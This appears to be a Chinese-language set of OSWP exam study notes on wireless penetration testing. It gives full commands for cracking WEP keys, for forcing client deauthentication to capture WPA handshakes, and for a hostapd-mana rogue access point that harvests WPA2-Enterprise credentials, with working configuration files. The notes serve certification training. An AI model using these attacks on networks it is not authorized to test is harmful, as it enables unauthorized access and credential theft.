## 准备知识
更新 Kali
```
sudo apt update
sudo apt full-upgrade -y
```

安装对应框架程序
```
sudo apt install airmon-ng reaver hashcat hostapd dnsmasq nftables apache2 libapache2-mod-php freeradius
```

更新本地 Git 仓库
```
可以使用：
git pull origin master

或者：
git pull origin main
```

报告生成
```
OSCP考试报告模板
https://github.com/noraj/OSCP-Exam-Report-Template-Markdown

创建 Markdown 文件：
ruby osert.rb init

生成 PDF：
ruby osert.rb generate

```

列出 USB 设备信息
```
sudo lsusb -vv
lsusb
sudo airmon-ng
```

恢复正常网络连接（重启网络）
```
sudo service networking restart
sudo service NetworkManager restart
或者
service networking start
service network-manager start
```


## 路线图

连接VPN
```
openvpn 
```

连接到目标系统（通过 SSH）：
```
ssh <username>@<target_ip> -p<port> ## 使用提供的 SSH 信息连接到目标系统
```

扫描附近的无线网络：
```
iw dev wlan0 scan | grep SSID ## 检测在无线网卡（wlan0）范围内的无线网络
```

设置无线网卡为监视模式：
```
airmon-ng start wlan0 ## 将无线网卡（wlan0）设置为监视模式
```

监听周围的网络：
```
airodump-ng mon0 ## 通过监听网络（在监视模式下）检测周围的网络
```

更改无线网卡的频道：
```
iwconfig mon0 channel 3 ## 更改无线网卡所在的频道
```

查看无线网卡所在的频道：
```
iwlist mon0 channel ## 查看无线网卡所在的频道
```

监听目标 AP（访问点）：
```
airodump-ng -c 3 --bssid <AP_MAC> -w <capture_file> mon0 ## 在指定频道上监听目标 AP（使用 BSSID）并将数据包保存到捕获文件
```







## WEP
```
> WEP（有线等效隐私）攻击：

  **认证方式：OPN（开放认证）** 或 **SKA（共享密钥认证）**？

  > **认证方式：OPN（开放认证）**

    **是否有客户端连接到 AP（接入点）？**  
    **YES（是）** 或 **NO（否）**？

    > **YES（是）**：

      - ARP 请求重放攻击
      - 交互式数据包重放攻击
      - 去认证攻击（可以在两种情况下使用，即有或没有客户端连接）
  
    > **NO（否）**：

      - 伪造认证攻击（可以在两种情况下使用，即有或没有客户端连接）
      - 分片攻击
      - Korek ChopChop 攻击

  > **认证方式：SKA（共享密钥认证）**（绕过 WEP 共享密钥认证）：

    **如果有客户端连接到 AP，可以按照以下步骤进行攻击：**

     - 去认证攻击
     - 伪造共享密钥认证攻击
     - ARP 请求重放攻击
     - 去认证攻击
     - 使用 Aircrack-ng 破解 WEP 密钥
```
### ARP重放攻击（加速IV收集）
```
步骤1：开始捕获数据包：

airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
第 2 步：虚假身份验证（如果需要）：

aireplay-ng -1 0 -a <BSSID> -h <your MAC> wlan0mon
步骤3：ARP重放攻击（注入ARP数据包以增加IV收集）：

aireplay-ng -3 -b <BSSID> -h <your MAC> wlan0mon
您将看到指示 ARP 数据包正在重放的消息。此攻击会增加捕获的弱 IV 的数量。

步骤 4：破解 WEP 密钥：

aircrack-ng <output file>.cap
```

### 碎片攻击
```
当没有可用的客户端时，碎片攻击很有用，您可以通过碎片数据包来破解 WEP 密钥。

步骤1：开始捕获数据包：

airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
第 2 步：虚假身份验证（如果需要）：

aireplay-ng -1 0 -a <BSSID> -h <your MAC> wlan0mon
步骤3：执行碎片攻击：

aireplay-ng -5 -b <BSSID> -h <your MAC> wlan0mon
目标是捕获数据包并将其分段，从而生成密钥流数据。

步骤4：使用Packetforge-ng创建ARP数据包：

一旦您有了可用的密钥流，就可以用来packetforge-ng创建伪造的 ARP 请求：
packetforge-ng -0 -a <AP MAC> -h <your MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <arp_packet>
步骤5：注入ARP数据包：

aireplay-ng -2 -r <arp_packet> wlan0mon
步骤6：破解WEP密钥：

aircrack-ng <output file>.cap
```

### Chop-Chop 攻击

chop-chop 攻击可帮助您解密加密的 WEP 数据包的一个字节并获取密钥流。

步骤1：开始捕获数据包：
```
airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
```
第 2 步：执行 Chop-Chop 攻击：
```
aireplay-ng -4 -b <BSSID> -h <your MAC> wlan0mon
```
您将捕获可用于伪造 ARP 数据包或执行解密的数据包的一部分。

步骤3：使用packetforge-ng创建ARP数据包：

使用获取的密钥流创建 ARP 请求：
```
packetforge-ng -0 -a <AP MAC> -h <your MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <arp_packet>
```
步骤4：注入ARP数据包：
```
aireplay-ng -2 -r <arp_packet> wlan0mon
```
步骤 5：破解 WEP 密钥：
```
aircrack-ng <output file>.cap
```


## WPA/WPA2

```
> WPA/WPA2

  ## 攻击：

    - 去认证攻击
  
  ## 破解网络密钥：

    - 使用 Aircrack-ng
    - 使用 JTR 和 Aircrack-ng
    - 使用 coWPAtty
    - 使用 Pyrit

```
### 攻击WPA/WPA2（PSK）

1.捕获 WPA 握手：
```
airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
```
2.取消对客户端的身份验证以强制重新进行身份验证：
```
aireplay-ng -0 5 -a <AP MAC> -c <Client MAC> wlan0mon
```
3.使用单词表破解 WPA/WPA2：推荐词汇表：rockyou.txt
```
aircrack-ng -w <wordlist> <output file>.cap
```





### WPA2/WPA3 企业攻击（手册1）

使用 (WPA2 Enterprise) 的恶意 AP 攻击hostapd-mana：

安装hostapd-mana：
```
apt-get install hostapd-mana
```

配置hostapd-mana： 编辑配置文件 ( hostapd-mana.conf) 以模仿目标网络的 SSID 并设置恶意 AP 来捕获企业凭证。

运行hostapd-mana：
```
hostapd-mana /path/to/hostapd-mana.conf
```
通过记录客户端进行身份验证的尝试来监控捕获的凭据。

手动 EAP 网络钓鱼攻击使用hostapd-mana：

修改hostapd-mana.conf以启用凭证网络钓鱼。

设置eap_user_file并eap_server_cert拦截和捕获 PEAP/MSCHAPv2 凭证。

启动恶意 AP 并捕获凭证：
```
hostapd-mana /path/to/hostapd-mana.conf
```
捕获的 PEAP/MSCHAPv2 凭证可以通过以下工具进行暴力破解john：
```
john --wordlist=<wordlist> captured_hashes.txt
```




### hostapd-mana.conf 模板
```
# hostapd-mana 命令的模板配置文件：
interface=wlan0
ssid=apname
channel=1
ieee80211n=1
hw_mode=g # 如果是 5GHz，设置为 a
wpa=3 # 1 只启用 WPA，2 启用 WPA2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD # 实际值不重要，因为我们是为了捕获握手，必须在 8 到 63 个字符之间
wpa_pairwise=TKIP CCMP # 仅适用于 WPA
rsn_pairwise =TKIP CCMP # 仅适用于 WPA2，选项 3 启用两者
mana_wpaout=/home/kali/name.hccapx # 指定保存握手的文件路径，每次握手都会追加到文件中，可以用 hashcat -m 2500 或 aircrack-ng 解密
# 如果 mana_wpaout 报错：未知配置项 'mana_wpaout'，请确保使用的是 hostapd-mana 命令，而不是 hostapd 命令

```

### WPA2/WPA3 企业攻击（手册2）
```
WPA2 企业版
按照以下步骤设置无线监控并执行攻击。

步骤 1：激活监控模式
airmon-ng check kill && airmon-ng start <interface>
第 2 步：检查 AUTH 列
airodump-ng <interface>
注意：AUTH 列将显示 MGT。

步骤 3：捕获握手
sudo airodump-ng -c channel -w ESSID interface
步骤 4：取消客户端身份验证以捕获握手
aireplay-ng -0 0 -a ESSID -c client_ESSID interface
步骤 5：使用 Wireshark 或 tshark 分析
收集 BSSID、ESSID 和频道后：

使用带有过滤器的 Wireshark 或 tshark：
wlan.bssid==E8:9C:12:02:66:AA && eap && tls.handshake.certificate
或者
tls.handshake.type == 11,3
步骤 6：使用 OpenSSL 保存证书
在 TLSv1 记录层 >> 握手协议 >> 证书中查看数据包详情：

openssl x509 -inform der -in cert.der -text
攻击所需的详细信息包括：发行人信息。

步骤 6.5（可选）：将证书转换为 PEM 格式
openssl x509 -inform der -in cert.der -outform pem -out output.crt
步骤 7：设置 FreeRADIUS 服务器
安装方式：

sudo apt install freeradius
编辑ca.cnf和server.cnf文件以减少可疑的证书颁发机构字段。

sudo mousepad /etc/freeradius/3.0/certs/ca.cnf
sudo mousepad /etc/freeradius/3.0/certs/server.cnf
使用正确的信息更新相应部分。

步骤 8：准备证书
导航到/etc/freeradius/3.0/certs/并运行：

sudo rm dh && make
注意：如果 FreeRADIUS 需要其他配置，请忽略来自 FreeRADIUS 的错误。

步骤 9：配置 hostapd-mana
/etc/hostapd-mana/mana.conf使用正确的 SSID、证书路径和 EAP 文件进行编辑。

步骤 10：设置mana.eap_user
/etc/hostapd-mana/mana.eap_user使用所需的协议和身份验证方法进行配置。

步骤11：启动hostapd-mana
hostapd-mana /etc/hostapd-mana/mana.conf
步骤 12：使用 asleap 查找用户
使用正确的命令运行 asleap 来查找登录成功的用户。

<asleap command> -W /usr/share/john/password.lst
步骤13：创建wpa_supplicant.conf文件
添加网络配置详细信息：

network={
  ssid="NetworkName"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="Domain\\username"
  password="password"
  eap=PEAP
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}
步骤 14：连接到网络
用于wpa_supplicant连接：

wpa_supplicant -c <config file>
```


#### 实际配置
```
ssid=xxxxxx
interface=wlan0
driver=nl80211

channel=11
hw_mode=g
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0

eap_user_file=/home/kali/MGT/mana.eap_user

ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key

private_key_passwd=whatever

dh_file=/etc/freeradius/3.0/certs/dh


auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP


wpa_pairwise=CCMP TKIP
mana_wpe=1
mana_credout=/home/kali/MGT/hostapd.credoutfile
mana_eapsuccess=1
mana_eaptls=1
```

####  实际连接配置
```
network={
  ssid="xxxxxx"
  scan_ssid=1
  key_mgmt=WPA-EAP
  eap=PEAP
  identity="xxxxxx\xxxxxx"
  password="xxxxxx"
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}
```



## wpa_supplicant 连接指定网络

### WEP

连接到 WEP 网络永久链接
```
network={
  ssid="SSID"
  key_mgmt=NONE
  wep_key0=""
  wep_tx_keyidx=0
}
```
注意：WEP 中的密码（wep_key0）如果是十六进制则应为小写，""
十六进制密码中大写字母也可以使用

设置ssid为您要连接的网络名称。然后，将其保存wep.conf并使用以下命令进行连接：
```
sudo wpa_supplicant -i <int> -c <file>
```
然后打开另一个终端并向ip服务器发出请求DHCP：
```
sudo dhclient wlan0 -v
```

### WPA

配置文件

```
network={
    ssid="SSID"
    psk="password"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```

将proto其设置为WPA(version)：

WPA
WPA2
WPA3

设置ssid为您要连接的网络名称。然后，将其保存wpa.conf并使用以下命令进行连接：
```
sudo wpa_supplicant -i <int> -c <file>
```

然后打开另一个终端并向ip服务器发出请求DHCP：
```
sudo dhclient wlan0 -v
```



### WPA 企业

连接到 WPA Enterprise
```
network={
  ssid="SSID"
  scan_ssid=1
  key_mgmt=WPA-EAP
  eap=PEAP
  identity="identity\user"
  password="password"
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}
```
设置identity为用户名和password密码。
设置ssid为您要连接的网络名称。然后，将其保存wpa_entp.conf并使用以下命令进行连接：
```
sudo wpa_supplicant -i <int> -c <file>
```
然后打开另一个终端并向ip服务器发出请求DHCP：
```
sudo dhclient wlan0 -v
```







## 参考
- https://brandonrussell.io/OSWP-Notes/Introduction.html
- https://zeyadazima.com/notes/oswplaybook/
- https://wizardforcel.gitbooks.io/kali-linux-wireless-pentest/content/
- https://github.com/legitaxes/OSWP-Notes
